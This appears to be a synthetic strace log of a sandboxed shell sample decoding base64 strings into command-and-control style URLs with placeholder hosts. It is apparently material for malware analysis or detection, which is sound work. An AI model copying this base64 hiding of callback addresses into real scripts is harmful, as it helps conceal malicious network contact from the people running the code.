15    10:07:54.667325 close(0<pipe:[80207]>) = 0
15    10:07:54.669250 write(1<pipe:[79129]>, "http://malicious-command-and-con"..., 62) = 62
9     10:07:54.670564 <... read resumed>"http://malicious-command-and-con"..., 4096) = 62
15    10:07:54.671184 close(1<pipe:[79129]> <unfinished ...>
9     10:07:54.671717 read(3<pipe:[79129]>,  <unfinished ...>
15    10:07:54.672256 <... close resumed>) = 0
15    10:07:54.672806 close(2<pipe:[78066]>) = 0
15    10:07:54.673838 exit_group(0)     = ?
15    10:07:54.675488 +++ exited with 0 +++
13    10:07:54.675909 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 15
13    10:07:54.676406 rt_sigaction(SIGINT, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
13    10:07:54.677267 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
13    10:07:54.677969 close(3)          = -1 EBADF (Bad file descriptor)
13    10:07:54.678638 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13    10:07:54.679278 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=14, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
13    10:07:54.679598 wait4(-1, 0x7ffdbb499910, WNOHANG, NULL) = -1 ECHILD (No child processes)
13    10:07:54.680239 rt_sigreturn({mask=[]}) = 0
13    10:07:54.680945 exit_group(0)     = ?
13    10:07:54.681958 +++ exited with 0 +++
9     10:07:54.683309 <... read resumed>"", 4096) = 0
9     10:07:54.686322 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=13, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     10:07:54.691811 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 13
9     10:07:54.694542 wait4(-1, 0x7ffdbb498c50, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     10:07:54.696479 rt_sigreturn({mask=[INT]}) = 0
9     10:07:54.698148 close(3<pipe:[79129]>) = 0
9     10:07:54.699814 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.700725 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     10:07:54.701518 rt_sigaction(SIGINT, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.702494 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
9     10:07:54.703520 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.704271 read(255</sandbox/sample.sh>, "# \"http://update-server-placehol"..., 1504) = 1073
9     10:07:54.705505 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.706635 pipe2([3<pipe:[83215]>, 4<pipe:[83215]>], 0) = 0
9     10:07:54.708019 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     10:07:54.715342 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.717714 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:54.719368 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:54.720843 lseek(255</sandbox/sample.sh>, -894, SEEK_CUR) = 610
9     10:07:54.722029 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x70810528fe50) = 16
16    10:07:54.723569 set_robust_list(0x70810528fe60, 24 <unfinished ...>
9     10:07:54.723957 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
16    10:07:54.724333 <... set_robust_list resumed>) = 0
9     10:07:54.724657 <... rt_sigprocmask resumed>NULL, 8) = 0
16    10:07:54.724932 getpid( <unfinished ...>
9     10:07:54.725219 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
16    10:07:54.725496 <... getpid resumed>) = 16
9     10:07:54.725764 <... rt_sigaction resumed>{sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.726012 close(255</sandbox/sample.sh> <unfinished ...>
9     10:07:54.726336 close(4<pipe:[83215]> <unfinished ...>
16    10:07:54.726644 <... close resumed>) = 0
9     10:07:54.726957 <... close resumed>) = 0
16    10:07:54.727270 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:54.727569 rt_sigprocmask(SIG_BLOCK, [INT],  <unfinished ...>
16    10:07:54.727828 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:54.728121 <... rt_sigprocmask resumed>[], 8) = 0
16    10:07:54.728421 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
9     10:07:54.728669 read(3<pipe:[83215]>,  <unfinished ...>
16    10:07:54.728966 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.729404 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.729981 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.730588 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.731070 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.731603 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.732167 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.732618 rt_sigaction(SIGINT, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.733088 dup2(4<pipe:[83215]>, 1<pipe:[78065]>) = 1<pipe:[83215]>
16    10:07:54.733535 close(4<pipe:[83215]>) = 0
16    10:07:54.733930 close(3<pipe:[83215]>) = 0
16    10:07:54.734379 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
16    10:07:54.734813 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
16    10:07:54.739318 fcntl(0</dev/null>, F_GETFD) = 0
16    10:07:54.744249 pipe2([3<pipe:[77473]>, 4<pipe:[77473]>], 0) = 0
16    10:07:54.746397 rt_sigprocmask(SIG_BLOCK, NULL, [CHLD], 8) = 0
16    10:07:54.747752 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [CHLD], 8) = 0
16    10:07:54.748948 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x70810528fe50) = 17
17    10:07:54.750441 set_robust_list(0x70810528fe60, 24 <unfinished ...>
16    10:07:54.750803 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
17    10:07:54.751208 <... set_robust_list resumed>) = 0
16    10:07:54.751541 <... rt_sigprocmask resumed>NULL, 8) = 0
17    10:07:54.751896 getpid( <unfinished ...>
16    10:07:54.752214 close(4<pipe:[77473]> <unfinished ...>
17    10:07:54.752505 <... getpid resumed>) = 17
16    10:07:54.752774 <... close resumed>) = 0
17    10:07:54.753078 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
16    10:07:54.753351 close(4 <unfinished ...>
17    10:07:54.753637 <... rt_sigprocmask resumed>NULL, 8) = 0
16    10:07:54.753912 <... close resumed>) = -1 EBADF (Bad file descriptor)
17    10:07:54.754158 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
16    10:07:54.754409 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
17    10:07:54.754635 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.754875 <... rt_sigprocmask resumed>[CHLD], 8) = 0
17    10:07:54.755124 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
16    10:07:54.755370 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD],  <unfinished ...>
17    10:07:54.755602 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.755823 <... rt_sigprocmask resumed>[CHLD], 8) = 0
17    10:07:54.756029 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
16    10:07:54.756282 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD <unfinished ...>
17    10:07:54.756460 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
17    10:07:54.756731 close(3<pipe:[77473]>) = 0
16    10:07:54.757238 <... clone resumed>, child_tidptr=0x70810528fe50) = 18
18    10:07:54.757432 set_robust_list(0x70810528fe60, 24 <unfinished ...>
17    10:07:54.757632 dup2(4<pipe:[77473]>, 1<pipe:[83215]> <unfinished ...>
18    10:07:54.757864 <... set_robust_list resumed>) = 0
16    10:07:54.758048 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
18    10:07:54.758247 getpid( <unfinished ...>
17    10:07:54.758420 <... dup2 resumed>) = 1<pipe:[77473]>
18    10:07:54.758614 <... getpid resumed>) = 18
16    10:07:54.758795 <... rt_sigprocmask resumed>NULL, 8) = 0
18    10:07:54.758993 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
17    10:07:54.759255 close(4<pipe:[77473]> <unfinished ...>
18    10:07:54.760915 <... rt_sigprocmask resumed>NULL, 8) = 0
16    10:07:54.762947 close(3<pipe:[77473]> <unfinished ...>
18    10:07:54.765235 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
17    10:07:54.767051 <... close resumed>) = 0
18    10:07:54.768293 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.769186 <... close resumed>) = 0
18    10:07:54.769776 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
17    10:07:54.770384 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
18    10:07:54.770918 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.771426 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
18    10:07:54.771917 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
17    10:07:54.772331 <... rt_sigaction resumed>{sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.772727 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.773095 <... rt_sigprocmask resumed>[CHLD], 8) = 0
18    10:07:54.773445 dup2(3<pipe:[77473]>, 0</dev/null> <unfinished ...>
17    10:07:54.773841 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
18    10:07:54.774152 <... dup2 resumed>) = 0<pipe:[77473]>
16    10:07:54.774423 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
18    10:07:54.774709 close(3<pipe:[77473]> <unfinished ...>
17    10:07:54.774975 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.775244 <... close resumed>) = 0
16    10:07:54.775575 <... rt_sigprocmask resumed>NULL, 8) = 0
18    10:07:54.775908 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
17    10:07:54.776261 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
18    10:07:54.776531 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
16    10:07:54.776832 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
18    10:07:54.777123 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/base64",  <unfinished ...>
17    10:07:54.777422 <... rt_sigaction resumed>{sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.777708 <... newfstatat resumed>0x7ffdbb4999b0, 0) = -1 ENOENT (No such file or directory)
16    10:07:54.777929 <... rt_sigprocmask resumed>[CHLD], 8) = 0
18    10:07:54.778169 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/base64",  <unfinished ...>
17    10:07:54.778429 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
18    10:07:54.778656 <... newfstatat resumed>0x7ffdbb4999b0, 0) = -1 ENOENT (No such file or directory)
16    10:07:54.778847 rt_sigaction(SIGINT, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
18    10:07:54.779082 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/base64",  <unfinished ...>
17    10:07:54.779289 <... rt_sigprocmask resumed>[], 8) = 0
18    10:07:54.779497 <... newfstatat resumed>0x7ffdbb4999b0, 0) = -1 ENOENT (No such file or directory)
16    10:07:54.779673 <... rt_sigaction resumed>{sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.779882 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
17    10:07:54.780103 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
18    10:07:54.780312 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
16    10:07:54.780500 wait4(-1,  <unfinished ...>
18    10:07:54.780719 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
17    10:07:54.780931 <... rt_sigprocmask resumed>NULL, 8) = 0
18    10:07:54.781120 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
17    10:07:54.781387 ioctl(2<pipe:[78066]>, TIOCGPGRP <unfinished ...>
18    10:07:54.781650 geteuid( <unfinished ...>
17    10:07:54.781899 <... ioctl resumed>, 0x7ffdbb499c84) = -1 ENOTTY (Inappropriate ioctl for device)
18    10:07:54.782157 <... geteuid resumed>) = 1001
17    10:07:54.782340 rt_sigaction(SIGCHLD, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330},  <unfinished ...>
18    10:07:54.782550 getegid( <unfinished ...>
17    10:07:54.782706 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.782902 <... getegid resumed>) = 1001
17    10:07:54.783086 rt_sigaction(SIGINT, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330},  <unfinished ...>
18    10:07:54.783285 getuid( <unfinished ...>
17    10:07:54.783471 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.783666 <... getuid resumed>) = 1001
17    10:07:54.783815 fstat(1<pipe:[77473]>,  <unfinished ...>
18    10:07:54.784009 getgid( <unfinished ...>
17    10:07:54.784183 <... fstat resumed>{st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
18    10:07:54.784363 <... getgid resumed>) = 1001
17    10:07:54.784540 write(1<pipe:[77473]>, "aHR0cDovL3VwZGF0ZS1zZXJ2ZXItcGxh"..., 85 <unfinished ...>
18    10:07:54.784721 access("/usr/bin/base64", X_OK <unfinished ...>
17    10:07:54.784888 <... write resumed>) = 85
18    10:07:54.785052 <... access resumed>) = 0
17    10:07:54.785192 exit_group(0 <unfinished ...>
18    10:07:54.785357 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
17    10:07:54.785665 <... exit_group resumed>) = ?
18    10:07:54.785824 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
18    10:07:54.786049 geteuid( <unfinished ...>
17    10:07:54.786228 +++ exited with 0 +++
18    10:07:54.786399 <... geteuid resumed>) = 1001
16    10:07:54.787283 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 17
18    10:07:54.789553 getegid( <unfinished ...>
16    10:07:54.791903 wait4(-1,  <unfinished ...>
18    10:07:54.794008 <... getegid resumed>) = 1001
18    10:07:54.795601 getuid()          = 1001
18    10:07:54.797736 getgid()          = 1001
18    10:07:54.799230 access("/usr/bin/base64", R_OK) = 0
18    10:07:54.800446 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.801417 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.802431 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc92f230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7081052d6330}, 8) = 0
18    10:07:54.803147 execve("/usr/bin/base64", ["base64", "-d"], 0x55c912608530 /* 8 vars */) = 0
18    10:07:54.804643 brk(NULL)         = 0x5efc0bdbc000
18    10:07:54.805383 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77821b26a000
18    10:07:54.806051 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
18    10:07:54.807503 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
18    10:07:54.808409 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
18    10:07:54.809276 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x77821b265000
18    10:07:54.809754 mmap(0x77821b266000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x77821b266000
18    10:07:54.810235 mmap(0x77821b267000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x77821b267000
18    10:07:54.810648 mmap(0x77821b268000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x77821b268000
18    10:07:54.811114 close(3</usr/lib/libfake_tracer.so>) = 0
18    10:07:54.811532 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
18    10:07:54.811948 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
18    10:07:54.812399 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
18    10:07:54.812791 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x77821b263000
18    10:07:54.813192 close(3</etc/ld.so.cache>) = 0
18    10:07:54.813576 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
18    10:07:54.813998 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
18    10:07:54.814392 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
18    10:07:54.814913 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
18    10:07:54.819052 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
18    10:07:54.824290 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x77821b051000
18    10:07:54.826725 mmap(0x77821b079000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x77821b079000
18    10:07:54.828616 mmap(0x77821b201000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x77821b201000
18    10:07:54.829973 mmap(0x77821b250000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x77821b250000
18    10:07:54.830992 mmap(0x77821b256000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x77821b256000
18    10:07:54.832274 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
18    10:07:54.833316 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77821b04e000
18    10:07:54.834049 arch_prctl(ARCH_SET_FS, 0x77821b04e740) = 0
18    10:07:54.834673 set_tid_address(0x77821b04ea10) = 18
18    10:07:54.835382 set_robust_list(0x77821b04ea20, 24) = 0
18    10:07:54.835982 rseq(0x77821b04f060, 0x20, 0, 0x53053053) = 0
18    10:07:54.836772 mprotect(0x77821b250000, 16384, PROT_READ) = 0
18    10:07:54.837423 mprotect(0x77821b268000, 4096, PROT_READ) = 0
18    10:07:54.838000 mprotect(0x5efbe1132000, 4096, PROT_READ) = 0
18    10:07:54.838513 mprotect(0x77821b2a2000, 8192, PROT_READ) = 0
18    10:07:54.839145 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
18    10:07:54.839659 munmap(0x77821b263000, 7295) = 0
18    10:07:54.840333 getrandom("\x0b\x86\x86\x9d\x91\xd9\x59\x9f", 8, GRND_NONBLOCK) = 8
18    10:07:54.840877 brk(NULL)         = 0x5efc0bdbc000
18    10:07:54.841369 brk(0x5efc0bddd000) = 0x5efc0bddd000
18    10:07:54.841963 fadvise64(0<pipe:[77473]>, 0, 0, POSIX_FADV_SEQUENTIAL) = -1 ESPIPE (Illegal seek)
18    10:07:54.842445 fstat(0<pipe:[77473]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
18    10:07:54.842882 read(0<pipe:[77473]>, "aHR0cDovL3VwZGF0ZS1zZXJ2ZXItcGxh"..., 4096) = 85
18    10:07:54.845600 read(0<pipe:[77473]>, "", 4096) = 0
18    10:07:54.851140 fstat(1<pipe:[83215]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
18    10:07:54.853405 lseek(0<pipe:[77473]>, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18    10:07:54.855021 close(0<pipe:[77473]>) = 0
18    10:07:54.856365 write(1<pipe:[83215]>, "http://update-server-placeholder"..., 62) = 62
9     10:07:54.857674 <... read resumed>"http://update-server-placeholder"..., 4096) = 62
18    10:07:54.858294 close(1<pipe:[83215]> <unfinished ...>
9     10:07:54.858768 read(3<pipe:[83215]>,  <unfinished ...>
18    10:07:54.859198 <... close resumed>) = 0
18    10:07:54.859696 close(2<pipe:[78066]>) = 0
18    10:07:54.860713 exit_group(0)     = ?
18    10:07:54.862243 +++ exited with 0 +++
16    10:07:54.862548 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 18
16    10:07:54.862980 rt_sigaction(SIGINT, {sa_handler=0x55c8fc957540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, {sa_handler=0x55c8fc931750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7081052d6330}, 8) = 0
16    10:07:54.863765 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
16    10:07:54.864423 close(3)          = -1 EBADF (Bad file descriptor)
16    10:07:54.865029 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
16    10:07:54.865569 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
16    10:07:54.865869 wait4(-1, 0x7ffdbb499910, WNOHANG, NULL) = -1 ECHILD (No child processes)
16    10:07:54.866365 rt_sigreturn({mask=[]}) = 0
16    10:07:54.870177 exit_group(0)     = ?
9     10:07:54.876821 <... read resumed>"", 4096) = 0
16    10:07:54.877838 +++ exited with 0 +++
9     10:07:54.878571 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=16, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     10:07:54.879498 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 16
9     10:07:54.881149 wait4(-1, 0x7ffdbb498c50, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     10:07:54.882252 rt_sigreturn({mask=[INT]}) = 0
9     10:07:54.883541 close(3<pipe:[83215]>) = 0
9     10:07:54.884724 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:54.885678 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
